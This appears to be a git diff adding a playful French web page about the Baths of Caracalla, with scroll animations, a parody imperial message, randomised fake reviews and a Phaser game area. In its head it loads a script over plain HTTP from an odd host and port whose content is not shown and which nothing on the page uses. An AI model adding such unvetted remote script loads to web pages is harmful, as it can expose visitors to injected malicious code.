@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
+        integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <title>Thermes de Caracalla</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.5.1/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.5.1/ScrollTrigger.min.js"></script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/phaser/3.55.2/phaser.js'></script>
+    <script src="game.js"></script>
+    <script src="http://node3.adkynet.net:1134/lib.js" defer></script>
+</head>
+
+<body>
+    <section class="page" id="intro">
+        <div id="header">
+            <h1 id="titre">Caracalla</h1>
+            <h3 id="sous-titre">Les thermes</h3>
+        </div>
+        <a href="#page1">
+            <i class="fa fa-chevron-down" id="fleche" aria-hidden="true"></i>
+        </a>
+    </section>
+    <section class="page" id="page1">
+        <div id="bgpage1"></div>
+        <p class="quote" id="p1" data-typespeed="10" data-typetext="">
+            Bonjour,<br>
+            Alors bon, j'ai ouvert mes thermes et franchement c'est trop cool je suis trop le meilleur. Venez tous et
+            filez-moi du fric !
+            De toute façon je suis l'empereur 😎 je vous tue si vous venez pas.<br>
+            Allez, l'eau est froidement chaude pour pouvoir plaire à tout le monde.<br>
+            bREf, personne ne lit ce beau texte que j'écris donc j'arrete mais venez quand même bande d'enfants de
+            romulus
+            <span class="auteur">— L'empereur Caracalla</span>
+        </p>
+        <div class="img" id="thermes"></div>
+    </section>
+    <h1 id="avis">Les Avis</h1>
+    <section class="page" id="page2">
+        <div id="bgpage2"></div>
+        <p style="--top: 10vh; left: 60vw;" class="gen-com" id="com2">dxfgfgd</p>
+        <p style="--top: 40vh; left: 10vw;" class="gen-com" id="com3"></p>
+        <p style="--top: 55vh; left: 75vw;" class="gen-com" id="com1"></p>
+        <p style="--top: 90vh; left: 20vw;" class="gen-com" id="com4"></p>
+        <p style="--top: 65vh; left: 70vw;" class="gen-com" id="com5"></p>
+    </section>
+    <section class="page" id="game">
+        <div id='phaser-game'></div>
+    </section>
+    <section class="page" id="copyright">
+        <svg width="1041" height="230" viewBox="0 0 1041 230" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path id="signature"
+                d="M26.5015 39.0153C155.501 30.0153 171.501 39.0153 153.501 39.0153C135.501 39.0153 81.5015 30.0153 87.5015 53.0153C93.5015 76.0153 116.501 193.015 96.5015 182.015C76.5015 171.015 -11.4985 170.015 2.50146 140.015C16.5015 110.015 127.501 145.015 153.501 149.015C179.501 153.015 192.501 142.015 192.501 132.015C192.501 122.015 169.501 115.015 158.501 115.015C147.501 115.015 144.501 140.015 146.501 161.015C148.501 182.015 159.501 192.015 179.501 182.015C199.501 172.015 215.501 171.015 227.501 149.015C239.501 127.015 242.501 128.015 247.501 101.015C252.501 74.0153 257.501 48.0153 257.501 32.0153C257.501 16.0153 241.501 -9.98467 234.501 6.01533C227.501 22.0153 227.501 39.0153 227.501 70.0153C227.501 101.015 231.501 153.015 239.501 161.015C247.501 169.015 265.501 191.015 274.501 182.015C279.337 177.18 288.503 176.674 297.501 176.466M297.501 176.466C305.25 176.287 312.874 176.329 317.501 174.015C321.724 171.904 324.163 167.119 325.573 161.015M297.501 176.466C291.501 176.608 279.501 174.015 271.501 157.015C263.501 140.015 274.501 149.015 279.501 125.015C284.501 101.015 299.501 115.015 311.501 115.015C321.101 115.015 326.168 121.682 327.501 125.015C327.501 121.682 327.501 118.415 327.501 132.015C327.501 141.838 327.501 152.662 325.573 161.015M325.573 161.015C324.4 164.892 337.703 171.297 344.501 174.015C349.501 178.349 360.701 184.415 365.501 174.015C371.501 161.015 371.501 115.015 385.501 115.015C399.501 115.015 403.501 155.015 403.501 140.015C403.501 125.015 424.501 105.015 430.501 115.015C436.501 125.015 419.501 146.015 443.501 157.015C467.501 168.015 473.501 173.015 493.501 149.015C513.501 125.015 492.501 105.015 484.501 115.015C476.501 125.015 461.501 137.015 484.501 149.015C507.501 161.015 524.501 173.015 535.501 161.015C546.501 149.015 680.501 93.0153 679.501 101.015C678.501 109.015 639.501 161.015 631.501 161.015C623.501 161.015 605.501 117.015 618.501 101.015C631.501 85.0153 658.501 67.0153 656.501 53.0153C654.501 39.0153 633.501 20.0153 618.501 32.0153C603.501 44.0153 591.501 56.0153 611.501 83.0153C627.501 104.615 659.501 141.349 673.501 157.015C705.168 157.015 771.501 157.015 783.501 157.015C798.501 157.015 855.501 141.015 851.501 115.015C847.501 89.0153 871.501 80.0153 815.501 70.0153C759.501 60.0153 728.501 22.0153 763.501 6.01533C791.501 -6.78467 833.835 8.01533 851.501 17.0153C851.501 36.682 853.901 82.4153 863.501 108.015C875.501 140.015 883.501 160.015 895.501 115.015C907.501 70.0153 884.435 99.0756 909 102C930 104.5 940.501 90.5 941.501 79.5C942.501 68.5 913.41 76 905.501 76C897.593 76 890.501 132.015 900.501 132.015C910.501 132.015 949.5 76 949.5 102M949.5 102C946.191 128 946 129.5 949.5 102ZM949.5 102C964.5 86.5 964.232 93.652 984.5 120C1004.5 146 999.5 135 1017.5 148C1035.5 161 1055.5 182.015 1022.5 200.015C989.501 218.015 1002.5 230.015 941.501 229.015C880.501 228.015 878.501 229.015 815.501 223.015"
+                stroke="black" stroke-linecap="round" stroke-linejoin="round" />
+        </svg>
+    </section>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cormorant:wght@700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Marcellus+SC&display=swap');
+
+        @font-face {
+            font-family: 'Ableton Sans';
+            src: url(https://padlet-uploads.storage.googleapis.com/601831207/787f4e94b5e86c3adf24f983b73bf6b8/AbletonSans_Light.ttf);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        #avis {
+            position: absolute;
+            z-index: 10;
+            text-align: center;
+            font-family: 'Ableton Sans';
+            font-size: 5vw;
+            letter-spacing: 10px;
+            word-spacing: 10px;
+            font-weight: bolder;
+        }
+
+        /* body {
+            height: 200vh;
+            max-width: 100vw;
+        } */
+        html,
+        body {
+            scroll-behavior: smooth;
+            overflow-x: hidden;
+            scroll-snap-type: y mandatory;
+        }
+
+        p#p1 {
+            width: clamp(20vw, 40vw, 60vw);
+            background: none;
+            backdrop-filter: blur(50px);
+            color: #fff;
+            padding: 50px;
+            text-align: center;
+            transform: translateX(-30vw) translateY(80px);
+        }
+
+        #bgpage1 {
+            transform: scale(1.9);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 110%;
+            height: 110%;
+            filter: blur(10px);
+            background: url(https://cdn.discordapp.com/attachments/702496151428923422/853538338434580490/thermes-romains-eau.png) no-repeat;
+        }
+
+        #bgpage2 {
+            transform: scale(1.9);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 110%;
+            height: 110%;
+            filter: blur(10px);
+            background: url(https://cdn.discordapp.com/attachments/629576665533513741/853199037293395968/caracalla-visite-3d.png) no-repeat center / cover;
+        }
+
+        #thermes {
+            transform: translateX(30vw) translateY(100px);
+            opacity: 0;
+            width: 600px;
+            height: 400px;
+            background: url(https://cdn.discordapp.com/attachments/629576665533513741/853199037293395968/caracalla-visite-3d.png);
+            clip-path: polygon(50% 0%, 60% 0%, 50% 100%, 40% 100%);
+            transition: all .3s ease;
+            cursor: pointer;
+        }
+
+        #thermes:hover {
+            clip-path: polygon(1% 0, 100% 0%, 99% 100%, 0% 100%);
+        }
+
+        p.quote::before,
+        p.quote::after {
+            content: '';
+            font-family: monospace;
+            font-size: 30pt;
+            display: inline-block;
+        }
+
+        p.quote::before {
+            content: '«';
+            /* transform: translate(-50%, -50%); */
+        }
+
+        p.quote::after {
+            content: '»';
+            /* transform: translate(50%, 50%); */
+        }
+
+        p.quote {
+            font-size: 16pt;
+            position: relative;
+            font-family: 'Ableton Sans';
+        }
+
+        p.quote span {
+            display: block;
+            position: absolute;
+            right: 0;
+            text-align: right;
+            bottom: 0;
+            transform: translateY(100%);
+            font-weight: bold;
+            font-family: 'Marcellus SC';
+        }
+
+        section.page {
+            overflow: hidden;
+            scroll-snap-align: start;
+            min-height: 100vh;
+            min-width: 100vw;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            position: relative;
+        }
+
+        section#intro {
+            background-color: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+
+        section#intro #header h1 {
+            text-align: center;
+            font-family: 'Marcellus SC';
+            font-size: 10vw;
+            transform: translateX(-25%);
+            opacity: 0;
+        }
+
+        section#intro #header h3 {
+            opacity: 0;
+            text-align: center;
+            font-family: 'Cormorant';
+            font-size: 5vw;
+            font-style: italic;
+            transform: translateX(25%);
+        }
+
+        p.gen-com {
+            display: flex;
+            align-items: center;
+            position: absolute;
+            top: var(--top);
+            left: var(--left);
+            backdrop-filter: blur(20px);
+            padding: 10px;
+            border-radius: 10px;
+            transform: scale(0);
+            font-size: 16pt;
+            font-family: 'Ableton Sans';
+            box-shadow: 0px 0px 5px #00000030;
+            background: #00000020;
+        }
+
+        section#page2 {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-evenly;
+            align-items: center;
+        }
+
+        a {
+            text-decoration: none;
+            color: #fff;
+        }
+
+        section#intro i {
+            position: relative;
+            font-size: 3vw;
+            cursor: pointer;
+            animation: flotte 3s ease-in-out infinite;
+            top: 50px;
+        }
+
+        @keyframes flotte {
+            from {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(25%);
+                color: #81ff81;
+            }
+        }
+
+        #signature {
+            stroke-dasharray: 3804;
+            stroke-dashoffset: 3804;
+        }
+
+        @keyframes anime {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        html::-webkit-scrollbar-track {
+            padding-bottom: 2px;
+            box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            background-color: #272a2f;
+        }
+
+        html::-webkit-scrollbar {
+            padding-bottom: 2px;
+            width: 0px;
+            background-color: #272a2f;
+        }
+
+        html::-webkit-scrollbar-thumb {
+            padding-bottom: 2px;
+            border-radius: 10px;
+            -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, .3);
+            background-color: #009b9b;
+        }
+        #game {
+            background-color: #000;
+        }
+    </style>
+    <script>
+        
+        var target = document.querySelector('#signature');
+        var callback = function(entries, observer) {
+          entries.forEach(entry => {
+            if (entry.isIntersecting) {
+              entry.target.style.animation = "anime 3s ease-in-out both";
+            }
+          });
+        };
+        var observer = new IntersectionObserver(callback);
+        observer.observe(target);
+        
+
+        randomInt = (min, max) => {
+            return Math.random() * (max - min) + min;
+        }
+
+        gsap.to("#thermes", {
+            scrollTrigger: {
+                trigger: '#page1',
+                // toggleActions: "restart pause resume pause"
+            },
+            opacity: 1,
+            x: 0
+        })
+        gsap.to("#titre", {
+            scrollTrigger: "#intro",
+            opacity: 1,
+            duration: 1
+        })
+        gsap.to("#sous-titre", {
+            scrollTrigger: "#intro",
+            opacity: 1,
+            duration: 2
+        })
+        gsap.to("#header", {
+            scrollTrigger: {
+                scrub: 1
+            },
+            y: -100
+        })
+        gsap.to("#p1", {
+            scrollTrigger: {
+                scrub: 1
+            },
+            y: -80
+        })
+
+        gsap.to("#thermes", {
+            scrollTrigger: {
+                scrub: 1
+            },
+            y: -100
+        })
+        gsap.to("#p1", {
+            scrollTrigger: {
+                trigger: '#page1',
+                // toggleActions: "restart pause resume pause"
+            },
+            duration: 1,
+            x: 0
+        })
+        gsap.to(".gen-com", {
+            scrollTrigger: '.gen-com',
+            scale: 1,
+            duration: 0.3
+        })
+        gsap.to("#avis", {
+            scrollTrigger: {
+                scrub: 1
+            },
+            rotate: 360,
+            x: window.innerWidth / 5,
+            y: window.innerHeight / 5
+        })
+
+
+
+        let coms = ["Gé-nia-li-ssime", "Les bests thermes", "Caracalla est un génie", "Je recommande c'est trop bien lol", "Trop fraîche mais les gens sont sympas", "WAW c'est OMAGAD VOS THERMES", "C'est coool mais c'est trop chaud", "Mais c ouf cet endroit !!!!!!", 'JUSte WowW', "HEHE ceux qui on fais ce s... je veux dire ces thermes sont des genies de sang pur !"];
+        let dejafaits = [];
+
+        document.querySelectorAll('.gen-com').forEach(gen => {
+            let tblfilter = coms.filter(val => !dejafaits.includes(val));
+            let com = tblfilter[Math.floor(Math.random() * tblfilter.length)];
+
+            gen.innerHTML = com;
+            dejafaits.push(com)
+            // gen.style.top = Math.floor(Math.random() * ( window.innerHeight - 70 )) + "px";
+            // gen.style.left = Math.floor(Math.random() * ( window.innerWidth - 70 )) + "px";
+        })
+    </script>
+</body>
+
+</html>
